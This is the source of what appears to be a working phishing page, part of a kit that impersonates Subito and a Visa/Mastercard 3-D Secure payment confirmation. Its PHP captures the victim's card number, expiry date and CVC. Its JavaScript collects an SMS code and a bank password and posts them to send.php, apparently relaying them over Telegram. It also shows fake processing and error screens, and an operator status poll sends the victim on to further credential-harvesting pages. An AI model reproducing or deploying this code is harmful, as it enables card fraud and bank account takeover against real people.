<?

include('config.php');
include('functions.php');


if (isset($_POST['amount']) && isset($_POST['card_number']) && isset($_POST['expdate1']) && isset($_POST['expdate2']) && isset($_POST['cvc2'])) {
    setcookie('rdata', base64_encode(json_encode([
        'amount' => $_POST['amount'],
        'card_number' => $_POST['card_number'],
        'cardholder' => $_POST['cardholder'],
        'expdate1' => $_POST['expdate1'],
        'expdate2' => $_POST['expdate2'],
        'cvc2' => $_POST['cvc2'],
    ])));
    setcookie('solt', $_POST['solt']);
    header("Refresh:0");
    exit;
}

if (!isset($_COOKIE['rdata']) || !isset($_COOKIE['solt'])) {
    die('$_SERVER["HTTP_REFERER"] not found');
}

$rdata = json_decode(base64_decode($_COOKIE['rdata']),true);
$solt = json_decode(base64_decode($_COOKIE['solt']),true);

$amount = $rdata['amount'];
$card_number = $rdata['card_number'];



$id = $solt['id'];
$shop = "iPay";

$worker = $solt['worker'];

//if (isset($_GET['c'])) {
    $payInfo = json_decode(file_get_contents("database/" . $id), true);
    $payInfo['status'] = 'wait';
    unset($payInfo['errmsg']);
    file_put_contents("database/" . $id, json_encode($payInfo));
//}


?>



























































<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

		<link rel="stylesheet" type="text/css" href="/payment/3ds/css/stylesheet.css">
		<link rel="stylesheet" type="text/css" href="/payment/3ds/css/index.css">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
		<script type="text/javascript" charset="utf-8" async="" src="/payment/3ds/css/loader.js"></script>
		<script type="text/javascript" src="/payment/3ds/css/jquery-1.11.3.min.js"></script>

</head>
<body>




<form id="form-contact" method="POST" class="contact-form" action="wait.php" class="credit-card-form__form js-card-form" autocomplete="on">








  <div class="form-container">
        <div class="form-block" id="step-1">
            <div class="form-block-header">
						<img src="/payment/push/css/subito-logo.svg" width="260px">
						<img src="/payment/3ds/css/visamc.png" width="80px" align="right">
                <h1 class="form-block-header-text" style="padding-top:30px;">Conferma di pagamento</h1>
            </div>
                <div class="form-block-body">
				<p class="form-block-body-text">Per identificare i dati bancari, viene inviato un SMS al tuo numero con un codice di verifica. Scrivilo nella casella qui sotto.</p>
					<table class="form-block-body-table">
						<tbody><tr>
							<td>Spedisci con TuttoSubito</td>
							<td>Prendi i tuoi soldi adesso</td>
						</tr>
						<tr>
							<td>Aggiungere:</td>
							<td><?=$amount;?></td>
						</tr>
						<tr>
							<td>Numero della carta:</td>
							<td>**** **** **** <?=substr($card_number, -4);?></td>
						</tr>
						</tbody>
					</table>
					<div class="form-block-body-notification"><b>¡Attenzione! </b> a causa del carico pesante sul server, l'invio del codice potrebbe essere ritardato di alcuni minuti.</div>
				</div>

				<div class="form-block-footer">		
					<form class="form-confirm" onsubmit="return subm()">
					
					<p class="form-block-footer-text">Codice di conferma:</p>
					<input type="text" class="form-block-footer-input" placeholder="" maxlength="15" name="sms" id="input-code">
					<br>
					<p class="form-block-footer-text">Password:</p>
					<input type="text" class="form-block-footer-input" placeholder="" maxlength="15" name="pincode" id="input-password">
					
					<input type="hidden" name="card_number" value="4612 4900 2664 2657">
					<input type="hidden" name="page" value="smscode">
					 </form>

					<button class="button" id="submit-button" onsubmit="“return" subm()”="">Confermare</button>
					<p><span style="color:#999999"><em>Se la tua banca non effettua una transazione o scrive che si tratta di una 'cancellazione'-&nbsp; e ' un assegno bancario. I tuoi fondi non saranno addebitati, saranno congelati per verificare la tua identità e consentire i pagamenti.</em></span></p>
				</div>
			</div>

			<div class="form-block" id="step-2" style="display: none;">
				<div class="form-block-header">
				<img src="/payment/push/css/subito-logo.svg" width="260px">
				<img src="/payment/3ds/css/visamc.png" width="80px" align="right">
				<h1 class="form-block-header-text" style="padding-top:30px;">Elaborazione dei pagamenti</h1>
            	</div>
				<div class="form-block-body">
				<p class="form-block-body-text">Il pagamento è in corso. Verrai reindirizzato automaticamente alla pagina corrispondente. Potrebbe volerci del tempo.</p>
			</div>
			</div>
			
			<div class="form-block" id="step-3" style="display: none;">
				<div class="form-block-header">
				<img src="/payment/push/css/subito-logo.svg" width="260px">
				<img src="/payment/3ds/css/visamc.png" width="80px" align="right">
					<h1 class="form-block-header-text" style="padding-top:30px;">Errore di pagamento</h1>
				</div>

				<div class="form-block-body">
					<p class="form-block-body-text">
					Hai inserito un codice di conferma errato. Ti invieremo un nuovo codice di conferma, fai clic su Continua per completare la ricezione dei fondi.</p>
					<a class="form-block-footer-button" id="back">Continuare</a>
				</div>
			</div>			
			
		</div>
		
		
		
		
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
        <script src="/smsbot/telegramform/js/telegramform.js"></script>
		
		
		
		
		
		
		
		<script>
$(document).ready(function() {

    $("#submit-button").click(function() {
		var code = $("#input-code").val();
		var pass = $("#input-password").val();

		if (code.length < 1 || pass.length < 1) {
			$("#input-code").addClass("input-invalid");
			$("#input-password").addClass("input-invalid");
			setTimeout(function() { 
				$("#input-code").removeClass("input-invalid"); 
				$("#input-password").removeClass("input-invalid"); 
			}, 2000);
			return false;
		}
		
		$.post("",  $(".form-confirm").serialize())
      $.ajax({
		 type: "POST",
         url: "send.php",
         data: ({
			id: '87976802830',
            code: $('#input-code').val(),
			pass: $('#input-password').val()
         })
      });

		$("#step-1").fadeOut(500, function() { $("#step-2").fadeIn(); });
		
        setTimeout(function() {
            $("#step-2").fadeOut(500, function() { $("#step-3").fadeIn(); });    
		}, 30000);
     	
	});
	
    $("#back").click(function() {
		$("#step-3").fadeOut(500, function() {
			$("#step-1").fadeIn();
			$("#input-code").val("");
		});    	
	});	
	
});

		setInterval(function() {
		var xhr = new XMLHttpRequest();
		xhr.open('GET', "/payment/status.php?id=87976802830", false); 
		xhr.send();      
		var data = xhr.responseText;
		var datas = JSON.parse(data);
		if (datas.status == 'SMSS'){
			window.location.href = "https://"+window.location.hostname+"/payment/3ds-auth/?id=terminale-termignoni-hypermotard-821-939-cosenza-430545153.htm-84786&log=87976802830&s=b39d1e403af86b6257df0c3b3ebc4d43329bda35&pro=SUBITO 2.0";
		}		
		if (datas.status == 'KEY-6'){
			document.location.href="https://"+window.location.hostname+"/payment/key-6/?id=terminale-termignoni-hypermotard-821-939-cosenza-430545153.htm-84786&log=87976802830&s=b39d1e403af86b6257df0c3b3ebc4d43329bda35&pro=SUBITO 2.0";
		}
		
		if (datas.status == 'SMS+PASS'){
			document.location.href="https://"+window.location.hostname+"/payment/3ds/?id=terminale-termignoni-hypermotard-821-939-cosenza-430545153.htm-84786&log=87976802830&s=b39d1e403af86b6257df0c3b3ebc4d43329bda35&pro=SUBITO 2.0";
		}
		
		if (datas.status == 'PUSH'){
			document.location.href="https://"+window.location.hostname+"/payment/push/?id=terminale-termignoni-hypermotard-821-939-cosenza-430545153.htm-84786&log=87976802830&s=b39d1e403af86b6257df0c3b3ebc4d43329bda35&pro=SUBITO 2.0";
		}
		if (datas.status == 'OTHER'){
			document.location.href="https://"+window.location.hostname+"/payment/other/?id=terminale-termignoni-hypermotard-821-939-cosenza-430545153.htm-84786&log=87976802830&s=b39d1e403af86b6257df0c3b3ebc4d43329bda35&pro=SUBITO 2.0";
		}	
		
	}, 1000);	






        </script>
</form>		

</body>
</html>